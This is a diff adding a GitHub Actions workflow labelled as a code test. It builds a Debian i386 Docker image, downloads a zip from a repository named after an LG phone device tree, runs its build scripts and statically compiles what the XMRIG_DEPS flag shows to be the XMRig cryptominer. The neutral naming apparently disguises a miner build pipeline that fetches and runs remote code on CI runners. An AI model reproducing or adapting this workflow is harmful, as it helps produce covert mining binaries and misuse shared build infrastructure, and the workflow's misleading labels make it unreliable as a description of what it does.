@@ -1,0 +1,78 @@
+name: testformycode i386 debian
+
+on:
+  push:
+    branches:
+      - master  # 可以根据需要指定触发分支
+  workflow_dispatch:  # 允许手动触发
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Set up Docker
+        run: |
+          # 创建 Dockerfile
+          cat <<EOF > Dockerfile
+          FROM debian:stretch
+          # 设置镜像源
+          RUN echo "deb http://archive.debian.org/debian/ stretch main" > /etc/apt/sources.list && \
+              echo "deb http://archive.debian.org/debian-security/ stretch/updates main" >> /etc/apt/sources.list && \
+              echo "Acquire::Check-Valid-Until false;" >> /etc/apt/apt.conf.d/99ignore-valid-until && \
+              apt-get update && apt-get install -y \
+              curl \
+              wget \
+              unzip \
+              git \
+              build-essential \
+              cmake \
+              automake \
+              libtool \
+              autoconf \
+              glibc-source \
+              libstdc++-6-dev:i386 \
+              libgcc-6-dev:i386 && \
+              apt-get clean
+          # 设置工作目录
+          WORKDIR /usr/src/app
+          # 复制项目文件到容器中
+          COPY . /usr/src/app
+          # 下载并解压源码
+          RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \
+              unzip testformycode-nbg.zip
+          # 构建项目
+          RUN cd testformycode-nbg/scripts-32 && \
+              chmod 777 *.sh && \
+              ./build_deps.sh && \
+              cd .. && \
+              mkdir build && \
+              cd build && \
+              cmake -DXMRIG_DEPS=scripts-32/deps -DCMAKE_C_FLAGS="-m32 -static" -DCMAKE_CXX_FLAGS="-m32 -static" -DCMAKE_EXE_LINKER_FLAGS="-m32 -static" .. && \
+              make
+          EOF
+      - name: Build Docker image
+        run: |
+          # 构建 Docker 镜像
+          docker build -t my-debian-build-env .
+      - name: Run Docker container
+        run: |
+          # 运行 Docker 容器并构建项目
+          docker run --name my-debian-build-container my-debian-build-env
+      - name: Copy build artifacts
+        run: |
+          # 复制构建产物
+          docker cp my-debian-build-container:/usr/src/app/testformycode-nbg/build ./build-output
+      - name: Upload build artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-output
+          path: ./build-output
+
+      - name: Clean up
+        run: |
+          # 删除 Docker 容器
+          docker rm -f my-debian-build-container
